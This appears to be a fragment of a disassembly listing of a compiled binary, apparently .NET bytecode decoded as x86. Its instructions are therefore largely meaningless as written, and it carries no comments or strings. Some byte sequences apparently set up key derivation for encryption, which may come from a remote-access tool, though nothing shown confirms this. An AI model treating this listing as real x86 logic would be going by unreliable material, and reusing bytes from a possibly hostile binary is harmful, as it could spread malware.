  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 a6             	or     -0x5a(%edx),%dh
  403d47:	21 00                	and    %eax,(%eax)
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	dc 01                	faddl  (%ecx)
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 ac                	jb     0x403d6d
  403dc1:	21 00                	and    %eax,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	72 0c                	jb     0x403dde
  403dd2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403dd6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403ddb:	25 00 00 00 07       	and    $0x7000000,%eax
  403de0:	72 16                	jb     0x403df8
  403de2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403de6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403deb:	60                   	pusha
  403dec:	00 00                	add    %al,(%eax)
  403dee:	00 07                	add    %al,(%edi)
  403df0:	72 24                	jb     0x403e16
  403df2:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  403df6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403dfb:	d9 00                	flds   (%eax)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e02:	00 00                	add    %al,(%eax)
  403e04:	16                   	push   %ss
  403e05:	28 1a                	sub    %bl,(%edx)
  403e07:	00 00                	add    %al,(%eax)
  403e09:	06                   	push   %es
  403e0a:	73 94                	jae    0x403da0
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	06                   	push   %es
  403e0f:	25 72 ac 21 00       	and    $0x21ac72,%eax
  403e14:	70 6f                	jo     0x403e85
  403e16:	7f 00                	jg     0x403e18
  403e18:	00 06                	add    %al,(%esi)
  403e1a:	72 0c                	jb     0x403e28
  403e1c:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e20:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e26:	c4 21                	les    (%ecx),%esp
  403e28:	00 70 6f             	add    %dh,0x6f(%eax)
  403e2b:	7f 00                	jg     0x403e2d
  403e2d:	00 06                	add    %al,(%esi)
  403e2f:	28 17                	sub    %dl,(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	06                   	push   %es
  403e34:	6a 6f                	push   $0x6f
  403e36:	74 00                	je     0x403e38
  403e38:	00 06                	add    %al,(%esi)
  403e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3b:	89 00                	mov    %eax,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	28 20                	sub    %ah,(%eax)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	16                   	push   %ss
  403e45:	28 18                	sub    %bl,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 06                	add    %al,(%esi)
  403e51:	72 3a                	jb     0x403e8d
  403e53:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e57:	7f 00                	jg     0x403e59
  403e59:	00 06                	add    %al,(%esi)
  403e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5c:	8b 00                	mov    (%eax),%eax
  403e5e:	00 06                	add    %al,(%esi)
  403e60:	28 42 00             	sub    %al,0x0(%edx)
  403e63:	00 06                	add    %al,(%esi)
  403e65:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e69:	00 7e 24             	add    %bh,0x24(%esi)
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	04 06                	add    $0x6,%al
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e76:	94                   	xchg   %eax,%esp
  403e77:	00 00                	add    %al,(%eax)
  403e79:	06                   	push   %es
  403e7a:	25 72 ac 21 00       	and    $0x21ac72,%eax
  403e7f:	70 6f                	jo     0x403ef0
  403e81:	7f 00                	jg     0x403e83
  403e83:	00 06                	add    %al,(%esi)
  403e85:	72 42                	jb     0x403ec9
  403e87:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e8b:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e91:	58                   	pop    %eax
  403e92:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e96:	7f 00                	jg     0x403e98
  403e98:	00 06                	add    %al,(%esi)
  403e9a:	06                   	push   %es
  403e9b:	72 3a                	jb     0x403ed7
  403e9d:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403ea1:	7f 00                	jg     0x403ea3
  403ea3:	00 06                	add    %al,(%esi)
  403ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea6:	8b 00                	mov    (%eax),%eax
  403ea8:	00 06                	add    %al,(%esi)
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	06                   	push   %es
  403eb4:	28 20                	sub    %ah,(%eax)
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	06                   	push   %es
  403eb9:	38 06                	cmp    %al,(%esi)
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	00 06                	add    %al,(%esi)
  403ebf:	28 47 00             	sub    %al,0x0(%edi)
  403ec2:	00 06                	add    %al,(%esi)
  403ec4:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403eca:	b3 00                	mov    $0x0,%bl
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403ed9:	72 66                	jb     0x403f41
  403edb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403edf:	7f 00                	jg     0x403ee1
  403ee1:	00 06                	add    %al,(%esi)
  403ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee4:	8b 00                	mov    (%eax),%eax
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	06                   	push   %es
  403ee9:	72 3a                	jb     0x403f25
  403eeb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403eef:	7f 00                	jg     0x403ef1
  403ef1:	00 06                	add    %al,(%esi)
  403ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef4:	7a 00                	jp     0x403ef6
  403ef6:	00 06                	add    %al,(%esi)
  403ef8:	28 41 00             	sub    %al,0x0(%ecx)
  403efb:	00 06                	add    %al,(%esi)
  403efd:	26 7e 24             	es jle 0x403f24
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 28                	add    $0x28,%al
  403f04:	01 00                	add    %eax,(%eax)
  403f06:	00 2b                	add    %ch,(%ebx)
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f0e:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f12:	00 12                	add    %dl,(%edx)
  403f14:	02 28                	add    (%eax),%ch
  403f16:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f1b:	09 72 3a             	or     %esi,0x3a(%edx)
  403f1e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f22:	7f 00                	jg     0x403f24
  403f24:	00 06                	add    %al,(%esi)
  403f26:	6f                   	outsl  %ds:(%esi),(%dx)
  403f27:	8b 00                	mov    (%eax),%eax
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	06                   	push   %es
  403f2c:	72 66                	jb     0x403f94
  403f2e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f32:	7f 00                	jg     0x403f34
  403f34:	00 06                	add    %al,(%esi)
  403f36:	6f                   	outsl  %ds:(%esi),(%dx)
  403f37:	8b 00                	mov    (%eax),%eax
  403f39:	00 06                	add    %al,(%esi)
  403f3b:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f41:	12 00                	adc    (%eax),%al
  403f43:	00 00                	add    %al,(%eax)
  403f45:	09 28                	or     %ebp,(%eax)
  403f47:	47                   	inc    %edi
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	06                   	push   %es
  403f4b:	7e 24                	jle    0x403f71
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 09                	add    $0x9,%al
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f57:	12 02                	adc    (%edx),%al
  403f59:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f5f:	b3 dd                	mov    $0xdd,%bl
  403f61:	0e                   	push   %cs
  403f62:	00 00                	add    %al,(%eax)
  403f64:	00 12                	add    %dl,(%edx)
  403f66:	02 fe                	add    %dh,%bh
  403f68:	16                   	push   %ss
  403f69:	04 00                	add    $0x0,%al
  403f6b:	00 1b                	add    %bl,(%ebx)
  403f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6e:	33 00                	xor    (%eax),%eax
  403f70:	00 0a                	add    %cl,(%edx)
  403f72:	dc dd                	(bad)
  403f74:	0f 00 00             	sldt   (%eax)
  403f77:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f7a:	00 00                	add    %al,(%eax)
  403f7c:	0a 28                	or     (%eax),%ch
  403f7e:	49                   	dec    %ecx
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	06                   	push   %es
  403f82:	dd 00                	fldl   (%eax)
  403f84:	00 00                	add    %al,(%eax)
  403f86:	00 2a                	add    %ch,(%edx)
  403f88:	41                   	inc    %ecx
  403f89:	4c                   	dec    %esp
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 00                	add    %al,(%eax)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 79 00             	add    %bh,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 31                	add    %dh,(%ecx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	01 02                	add    %eax,(%edx)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	00 62 01             	add    %ah,0x1(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	57                   	push   %edi
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 cc                	add    %cl,%ah
  403fc5:	01 00                	add    %eax,(%eax)
  403fc7:	00 cc                	add    %cl,%ah
  403fc9:	01 00                	add    %eax,(%eax)
  403fcb:	00 0f                	add    %cl,(%edi)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 00                	add    %al,(%eax)
  403fd3:	01 13                	add    %edx,(%ebx)
  403fd5:	30 0b                	xor    %cl,(%ebx)
  403fd7:	00 11                	add    %dl,(%ecx)
  403fd9:	01 00                	add    %eax,(%eax)
  403fdb:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fde:	00 11                	add    %dl,(%ecx)
  403fe0:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fe6:	72 3a                	jb     0x404022
  403fe8:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403fec:	7f 00                	jg     0x403fee
  403fee:	00 06                	add    %al,(%esi)
  403ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff1:	8b 00                	mov    (%eax),%eax
  403ff3:	00 06                	add    %al,(%esi)
  403ff5:	28 42 00             	sub    %al,0x0(%edx)
  403ff8:	00 06                	add    %al,(%esi)
  403ffa:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404000:	c0 00 00             	rolb   $0x0,(%eax)
  404003:	0a 72 70             	or     0x70(%edx),%dh
  404006:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40400a:	c1 00 00             	roll   $0x0,(%eax)
  40400d:	0a 28                	or     (%eax),%ch
  40400f:	c2 00 00             	ret    $0x0
  404012:	0a 0a                	or     (%edx),%cl
  404014:	7e 25                	jle    0x40403b
  404016:	00 00                	add    %al,(%eax)
  404018:	04 3a                	add    $0x3a,%al
  40401a:	85 00                	test   %eax,(%eax)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	20 00                	and    %al,(%eax)
  404020:	01 00                	add    %eax,(%eax)
  404022:	00 72 8c             	add    %dh,-0x74(%edx)
  404025:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  404029:	d0 0f                	rorb   $1,(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	02 28                	add    (%eax),%ch
  40402f:	c3                   	ret
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 1f                	or     (%edi),%bl
  404034:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  40403a:	25 16 16 14 28       	and    $0x28141616,%eax
  40403f:	c4 00                	les    (%eax),%eax
  404041:	00 0a                	add    %cl,(%edx)
  404043:	a2 25 17 17 14       	mov    %al,0x14171725
  404048:	28 c4                	sub    %al,%ah
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  404052:	28 c4                	sub    %al,%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  40405c:	28 c4                	sub    %al,%ah
  40405e:	00 00                	add    %al,(%eax)
  404060:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  404066:	28 c4                	sub    %al,%ah
  404068:	00 00                	add    %al,(%eax)
  40406a:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404070:	28 c4                	sub    %al,%ah
  404072:	00 00                	add    %al,(%eax)
  404074:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  40407a:	28 c4                	sub    %al,%ah
  40407c:	00 00                	add    %al,(%eax)
  40407e:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  404084:	28 c4                	sub    %al,%ah
  404086:	00 00                	add    %al,(%eax)
  404088:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  40408e:	28 c4                	sub    %al,%ah
  404090:	00 00                	add    %al,(%eax)
  404092:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  404098:	0a 28                	or     (%eax),%ch
  40409a:	c6 00 00             	movb   $0x0,(%eax)
  40409d:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040a3:	7e 25                	jle    0x4040ca
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 7b                	add    $0x7b,%al
  4040a9:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	04 06                	add    $0x6,%al
  4040b3:	28 06                	sub    %al,(%esi)
  4040b5:	00 00                	add    %al,(%eax)
  4040b7:	06                   	push   %es
  4040b8:	7e 0b                	jle    0x4040c5
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 7e                	add    $0x7e,%al
  4040be:	10 00                	adc    %al,(%eax)
  4040c0:	00 04 02             	add    %al,(%edx,%eax,1)
  4040c3:	72 94                	jb     0x404059
  4040c5:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4040c9:	7f 00                	jg     0x4040cb
  4040cb:	00 06                	add    %al,(%esi)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	7a 00                	jp     0x4040d0
  4040d0:	00 06                	add    %al,(%esi)
  4040d2:	7e 1e                	jle    0x4040f2
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	04 7e                	add    $0x7e,%al
  4040d8:	08 00                	or     %al,(%eax)
  4040da:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040dd:	0f 00 00             	sldt   (%eax)
  4040e0:	04 7e                	add    $0x7e,%al
  4040e2:	04 00                	add    $0x0,%al
  4040e4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040e7:	c8 00 00 0a          	enter  $0x0,$0xa
  4040eb:	28 48 00             	sub    %cl,0x0(%eax)
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	2a 00                	sub    (%eax),%al
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	1b 30                	sbb    (%eax),%esi
  4040f6:	03 00                	add    (%eax),%eax
  4040f8:	5c                   	pop    %esp
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 15 00 00 11 02    	add    %dl,0x2110000
  404101:	28 18                	sub    %bl,(%eax)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 03                	or     (%ebx),%al
  404107:	28 ca                	sub    %cl,%dl
  404109:	00 00                	add    %al,(%eax)
  40410b:	0a 39                	or     (%ecx),%bh
  40410d:	0b 00                	or     (%eax),%eax
  40410f:	00 00                	add    %al,(%eax)
  404111:	72 c2                	jb     0x4040d5
  404113:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404117:	cb                   	lret
  404118:	00 00                	add    %al,(%eax)
  40411a:	0a 7a 03             	or     0x3(%edx),%bh
  40411d:	7e 2c                	jle    0x40414b
  40411f:	00 00                	add    %al,(%eax)
  404121:	04 20                	add    $0x20,%al
  404123:	50                   	push   %eax
  404124:	c3                   	ret
  404125:	00 00                	add    %al,(%eax)
  404127:	73 cc                	jae    0x4040f5
  404129:	00 00                	add    %al,(%eax)
  40412b:	0a 0a                	or     (%edx),%cl
  40412d:	02 06                	add    (%esi),%al
  40412f:	1f                   	pop    %ds
  404130:	20 6f cd             	and    %ch,-0x33(%edi)
  404133:	00 00                	add    %al,(%eax)
  404135:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404138:	00 00                	add    %al,(%eax)
  40413a:	04 02                	add    $0x2,%al
  40413c:	06                   	push   %es
  40413d:	1f                   	pop    %ds
  40413e:	40                   	inc    %eax
  40413f:	6f                   	outsl  %ds:(%esi),(%dx)
  404140:	cd 00                	int    $0x0
  404142:	00 0a                	add    %cl,(%edx)
  404144:	7d 2b                	jge    0x404171
  404146:	00 00                	add    %al,(%eax)
  404148:	04 dd                	add    $0xdd,%al
  40414a:	0d 00 00 00 06       	or     $0x6000000,%eax
  40414f:	39 06                	cmp    %eax,(%esi)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 06                	add    %al,(%esi)
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	33 00                	xor    (%eax),%eax
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	dc 2a                	fsubrl (%edx)
  40415c:	01 10                	add    %edx,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  404167:	0d 00 00 00 00       	or     $0x0,%eax
  40416c:	1b 30                	sbb    (%eax),%esi
  40416e:	05 00 15 01 00       	add    $0x11500,%eax
  404173:	00 16                	add    %dl,(%esi)
  404175:	00 00                	add    %al,(%eax)
  404177:	11 03                	adc    %eax,(%ebx)
  404179:	3a 0b                	cmp    (%ebx),%cl
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 72 0a             	add    %dh,0xa(%edx)
  404180:	27                   	daa
  404181:	00 70 73             	add    %dh,0x73(%eax)
  404184:	cf                   	iret
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 7a 73             	or     0x73(%edx),%bh
  40418a:	d0 00                	rolb   $1,(%eax)
  40418c:	00 0a                	add    %cl,(%edx)
  40418e:	0a 06                	or     (%esi),%al
  404190:	1f                   	pop    %ds
  404191:	20 6a 6f             	and    %ch,0x6f(%edx)
  404194:	4e                   	dec    %esi
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40419a:	00 00                	add    %al,(%eax)
  40419c:	0a 0b                	or     (%ebx),%cl
  40419e:	07                   	pop    %es
  40419f:	20 00                	and    %al,(%eax)
  4041a1:	01 00                	add    %eax,(%eax)
  4041a3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	0a 07                	or     (%edi),%al
